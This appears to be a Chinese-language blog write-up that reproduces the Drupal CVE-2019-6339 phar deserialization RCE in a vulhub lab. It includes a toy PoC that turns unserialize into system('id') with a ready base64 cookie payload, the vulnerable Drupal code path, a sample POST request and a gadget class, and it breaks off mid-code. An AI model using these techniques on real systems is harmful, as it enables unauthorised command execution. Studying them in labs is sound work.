{"title":"CVE-2019-6339","date":"2023-03-21T15:06:01.000Z","date_formatted":{"ll":"Mar 21, 2023","L":"03/21/2023","MM-DD":"03-21"},"link":"2023/03/21/CVE-2019-6339","updated":"2023-03-21T15:08:55.849Z","content":"<p>Drupal RCE<br>\nphar 反序列化到 RCE</p>\n<span id=\"more\"></span>\n<h2 id=\"cve-2019-6339\">CVE-2019-6339<a title=\"#cve-2019-6339\" href=\"#cve-2019-6339\"></a></h2>\n<h3 id=\"復現環境\">復現環境<a title=\"#復現環境\" href=\"#復現環境\"></a></h3>\n<ul>\n<li><a href=\"https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2019-6339\" target=\"_blank\">https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2019-6339</a></li>\n<li>基本上照上面的說明就可以架起來了，我自己有稍微改一下 <code>docker-compose.yml</code> 裡面的 port，改成 9898</li>\n<li>還有一個需要注意的地方，記得在安裝的時候要選擇 sqlite，因為沒有 mysql 的環境，在文本裡面有提及到</li>\n</ul>\n<h3 id=\"phar\">Phar<a title=\"#phar\" href=\"#phar\"></a></h3>\n<ul>\n<li>在 PHP 中，PHAR 代表 “PHP Archive”，是一個用於封裝和部署 PHP 應用程式的工具。它可以將整個 PHP 應用程式打包成一個單獨的文件，並且可以輕鬆地在不同的環境中部署和運行。PHAR 文件類似於 zip 文件，但是它們是特定於 PHP 的，可以包含 PHP 程式碼、圖像、配置文件等資源。（感謝 ChatGPT）</li>\n</ul>\n<h4 id=\"結構\">結構<a title=\"#結構\" href=\"#結構\"></a></h4>\n<p>由 4 個部分組成</p>\n<ul>\n<li><code>stub</code>\n<ul>\n<li>phar 檔案標頭，一定要有這一段程式碼 <code>&lt;?php __HALT_COMPILER();?&gt;</code></li>\n</ul>\n</li>\n<li><code>manifest</code>\n<ul>\n<li>存放檔案屬性權限之類的訊息以序列化儲存，也是反序列化主要的攻擊點</li>\n</ul>\n</li>\n<li><code>contents</code>\n<ul>\n<li>內容</li>\n</ul>\n</li>\n<li><code>signature</code>\n<ul>\n<li>簽名</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"functions\">functions<a title=\"#functions\" href=\"#functions\"></a></h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy                file_exists         file_get_contents   file_put_contents   </span><br><span class=\"line\">file                fileatime           filectime           filegroup           </span><br><span class=\"line\">fileinode           filemtime           fileowner           fileperms           </span><br><span class=\"line\">filesize            filetype            fopen               is_dir              </span><br><span class=\"line\">is_executable       is_file             is_link             is_readable         </span><br><span class=\"line\">is_writable         lstat               mkdir               parse_ini_file      </span><br><span class=\"line\">readfile            rename              rmdir               stat                </span><br><span class=\"line\">touch               unlink              </span><br></pre></td></tr></table></figure>\n<ul>\n<li>以上的 functions 是可以 trigger phar 反序列化的\n<ul>\n<li><a href=\"https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2019/06/26/exploiting_php_phar-PRD7.html\" target=\"_blank\">https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2019/06/26/exploiting_php_phar-PRD7.html</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"序列化和反序列化\">序列化和反序列化<a title=\"#序列化和反序列化\" href=\"#序列化和反序列化\"></a></h3>\n<ul>\n<li>序列化和反序列化是指在 php 中將 php 的數據類型例如說 Object 等等轉換為字串，以便於儲存或是傳輸，以及將這些字符串轉換回原始的 php 數據類型的過程</li>\n</ul>\n<h4 id=\"example\">Example<a title=\"#example\" href=\"#example\"></a></h4>\n<ul>\n<li>直接給個範例可能比較清楚\n<ul>\n<li><a href=\"http://h4ck3r.quest:8602/\" target=\"_blank\">http://h4ck3r.quest:8602/</a></li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;source&#x27;</span>]) &amp;&amp; <span class=\"keyword\">die</span>(!<span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Magic</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cast</span>(<span class=\"params\"><span class=\"variable\">$spell</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;alert(&#x27;MAGIC, <span class=\"subst\">$spell</span>!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Useless class?</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Caster</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$cast_func</span> = <span class=\"string\">&#x27;intval&#x27;</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cast</span>(<span class=\"params\"><span class=\"variable\">$val</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"variable language_\">$this</span>-&gt;cast_func)(<span class=\"variable\">$val</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cat</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$magic</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$spell</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$spell</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;magic = <span class=\"keyword\">new</span> <span class=\"title class_\">Magic</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;spell = <span class=\"variable\">$spell</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Cat Wakeup!\\n&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;magic-&gt;<span class=\"title function_ invoke__\">cast</span>(<span class=\"variable\">$this</span>-&gt;spell);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;spell&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$cat</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Cat</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;spell&#x27;</span>]);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;cat&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Unserialize...\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$cat</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;cat&#x27;</span>]));</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$cat</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Cat</span>(<span class=\"string\">&quot;meow-meow-magic&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>主要的扣長上面的樣子，可以看到說主要觸發反序列化在 <code>$cat = unserialize(base64_decode($_COOKIE['cat']));</code></li>\n<li><code>__wakeup()</code> 是 php 提供的一個 funtion，當反序列一個對象成功之後會自動執行該對象的 <code>__wakeup()</code> function</li>\n<li>大概的思路是構造一個 <code>Cat</code> 的物件，因為要觸發到 <code>__wakeup()</code> function，然後把 <code>Magic()</code> 換成 <code>Caster()</code> 又加上 <code>__wakeup()</code> function 裡面所呼叫的 function <code>cast</code> 跟 <code>Caster</code> 的 function 是一樣的，就可以構造出任意的 function\n<ul>\n<li><code>($this-&gt;cast_func)</code> 可以把 <code>public $cast_func = 'whatever';</code> 把 whatever 改成自己要的 function</li>\n<li><code>($val)</code> 是透過 <code>Cat</code> 給的 <code>spell</code> 帶入的</li>\n</ul>\n</li>\n<li>完整的 PoC 大概長這樣</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Magic</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cast</span>(<span class=\"params\"><span class=\"variable\">$spell</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;<span class=\"subst\">$spell</span>&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Useless class?</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Caster</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$cast_func</span> = <span class=\"string\">&#x27;system&#x27;</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cast</span>(<span class=\"params\"><span class=\"variable\">$val</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"variable language_\">$this</span>-&gt;cast_func)(<span class=\"variable\">$val</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cat</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$magic</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$spell</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$spell</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;magic = <span class=\"keyword\">new</span> <span class=\"title class_\">Caster</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;spell = <span class=\"variable\">$spell</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Cat Wakeup!\\n&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;magic-&gt;<span class=\"title function_ invoke__\">cast</span>(<span class=\"variable\">$this</span>-&gt;spell);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Cat</span>(<span class=\"string\">&quot;id&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">// cat=TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjI6ImlkIjt9</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>)));</span><br></pre></td></tr></table></figure>\n<ul>\n<li>以上就是簡單的反序列化相關題目的 example</li>\n</ul>\n<h3 id=\"漏洞分析\">漏洞分析<a title=\"#漏洞分析\" href=\"#漏洞分析\"></a></h3>\n<ul>\n<li>主要觸發漏洞的點在 <code>/var/www/html/core/modules/system/system.module</code></li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">system_check_directory</span>(<span class=\"params\"><span class=\"variable\">$form_element</span>, FormStateInterface <span class=\"variable\">$form_state</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"variable\">$directory</span> = <span class=\"variable\">$form_element</span>[<span class=\"string\">&#x27;#value&#x27;</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$directory</span>) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$form_element</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$logger</span> = <span class=\"title class_\">\\Drupal</span>::<span class=\"title function_ invoke__\">logger</span>(<span class=\"string\">&#x27;file system&#x27;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">is_dir</span>(<span class=\"variable\">$directory</span>) &amp;&amp; !<span class=\"title function_ invoke__\">drupal_mkdir</span>(<span class=\"variable\">$directory</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">TRUE</span>)) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// If the directory does not exists and cannot be created.</span></span><br><span class=\"line\">    <span class=\"variable\">$form_state</span>-&gt;<span class=\"title function_ invoke__\">setErrorByName</span>(<span class=\"variable\">$form_element</span>[<span class=\"string\">&#x27;#parents&#x27;</span>][<span class=\"number\">0</span>], <span class=\"title function_ invoke__\">t</span>(<span class=\"string\">&#x27;The directory %directory does not exist and could not be created.&#x27;</span>, [<span class=\"string\">&#x27;%directory&#x27;</span> =&gt; <span class=\"variable\">$directory</span>]));</span><br><span class=\"line\">    <span class=\"variable\">$logger</span>-&gt;<span class=\"title function_ invoke__\">error</span>(<span class=\"string\">&#x27;The directory %directory does not exist and could not be created.&#x27;</span>, [<span class=\"string\">&#x27;%directory&#x27;</span> =&gt; <span class=\"variable\">$directory</span>]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">is_dir</span>(<span class=\"variable\">$directory</span>) &amp;&amp; !<span class=\"title function_ invoke__\">is_writable</span>(<span class=\"variable\">$directory</span>) &amp;&amp; !<span class=\"title function_ invoke__\">drupal_chmod</span>(<span class=\"variable\">$directory</span>)) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// If the directory is not writable and cannot be made so.</span></span><br><span class=\"line\">    <span class=\"variable\">$form_state</span>-&gt;<span class=\"title function_ invoke__\">setErrorByName</span>(<span class=\"variable\">$form_element</span>[<span class=\"string\">&#x27;#parents&#x27;</span>][<span class=\"number\">0</span>], <span class=\"title function_ invoke__\">t</span>(<span class=\"string\">&#x27;The directory %directory exists but is not writable and could not be made writable.&#x27;</span>, [<span class=\"string\">&#x27;%directory&#x27;</span> =&gt; <span class=\"variable\">$directory</span>]));</span><br><span class=\"line\">    <span class=\"variable\">$logger</span>-&gt;<span class=\"title function_ invoke__\">error</span>(<span class=\"string\">&#x27;The directory %directory exists but is not writable and could not be made writable.&#x27;</span>, [<span class=\"string\">&#x27;%directory&#x27;</span> =&gt; <span class=\"variable\">$directory</span>]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">elseif</span> (<span class=\"title function_ invoke__\">is_dir</span>(<span class=\"variable\">$directory</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$form_element</span>[<span class=\"string\">&#x27;#name&#x27;</span>] == <span class=\"string\">&#x27;file_public_path&#x27;</span>) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// Create public .htaccess file.</span></span><br><span class=\"line\">      <span class=\"title function_ invoke__\">file_save_htaccess</span>(<span class=\"variable\">$directory</span>, <span class=\"literal\">FALSE</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// Create private .htaccess file.</span></span><br><span class=\"line\">      <span class=\"title function_ invoke__\">file_save_htaccess</span>(<span class=\"variable\">$directory</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"variable\">$form_element</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在 Drupal 中，<code>.module</code> 是 php module 檔案的副檔名，可以簡單理解成他就是 php 檔案</li>\n<li>在上面的程式碼中可以看到一個看過的 function <code>is_dir</code>，在前面的 functions 有提到過這個是可以解析 <code>phar://</code> 協議的其中一個 function</li>\n<li>這個觸發的位置在 <code>http://0.0.0.0:9898/admin/config/media/file-system</code>，可以透過 POST 封包的內容追蹤傳輸的參數也是可以追到一樣的位置</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /admin/config/media/file-system HTTP/1.1</span><br><span class=\"line\">Host: 0.0.0.0:9898</span><br><span class=\"line\">Content-Length: 257</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Origin: http://0.0.0.0:9898</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Referer: http://0.0.0.0:9898/admin/config/media/file-system</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: en-US,en;q=0.9</span><br><span class=\"line\">Cookie: SESS19e36255972107d42b8cecb77ef5622e=RC1AxhxGu-UYP8-sVplip04z-i3jZOoo2JlsgIs0lro</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">file_temporary_path=%2Ftmp&amp;file_default_scheme=public&amp;temporary_maximum_age=21600&amp;form_build_id=form-8KDu_CCd8wAhGWMxW_4v7mS0dB1uRXPdugDCkli-wAo&amp;form_token=42xlLXm8aR-5coGDm2_11cVwCSXRJio-ou1mqMIOnho&amp;form_id=system_file_system_settings&amp;op=Save+configuration</span><br></pre></td></tr></table></figure>\n<ul>\n<li>參數 <code>file_temporary_path</code> 就是 <code>is_dir</code> 吃的參數</li>\n<li>還缺一個反序列化的 class 可以用的</li>\n<li>在 <code>/var/www/html/vendor/guzzlehttp/psr7/src/FnStream.php</code></li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">GuzzleHttp</span>\\<span class=\"title class_\">Psr7</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Psr</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Message</span>\\<span class=\"title\">StreamInterface</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Compose stream implementations based on a hash of functions.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Allows for easy testing and extension of a provided stream without needing</span></span><br><span class=\"line\"><span class=\"comment\"> * to create a concrete class for a simple extension point.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FnStream</span> <span class=\"keyword\">implements</span> <span class=\"title\">StreamInterface</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/** <span class=\"doctag\">@var</span> array */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$methods</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** <span class=\"doctag\">@var</span> array Methods that must be implemented in the given array */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"built_in\">static</span> <span class=\"variable\">$slots</span> = [<span class=\"string\">&#x27;__toString&#x27;</span>, <span class=\"string\">&#x27;close&#x27;</span>, <span class=\"string\">&#x27;detach&#x27;</span>, <span class=\"string\">&#x27;rewind&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;getSize&#x27;</span>, <span class=\"string\">&#x27;tell&#x27;</span>, <span class=\"string\">&#x27;eof&#x27;</span>, <span class=\"string\">&#x27;isSeekable&#x27;</span>, <span class=\"string\">&#x27;seek&#x27;</span>, <span class=\"string\">&#x27;isWritable&#x27;</span>, <span class=\"string\">&#x27;write&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;isReadable&#x27;</span>, <span class=\"string\">&#x27;read&#x27;</span>, <span class=\"string\">&#x27;getContents&#x27;</span>, <span class=\"string\">&#x27;getMetadata&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> array $methods Hash of method name to a callable.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"keyword\">array</span> <span class=\"variable\">$methods</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;methods = <span class=\"variable\">$methods</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Create the functions on the class</span></span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"variable\">$methods</span> <span class=\"keyword\">as</span> <span class=\"variable\">$name</span> =&gt; <span class=\"variable\">$fn</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;&#123;<span class=\"string\">&#x27;_fn_&#x27;</span> . <span class=\"variable\">$name</span>&#125; = <span class=\"variable\">$fn</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">// 略</span></span><br><span class=\"line\">  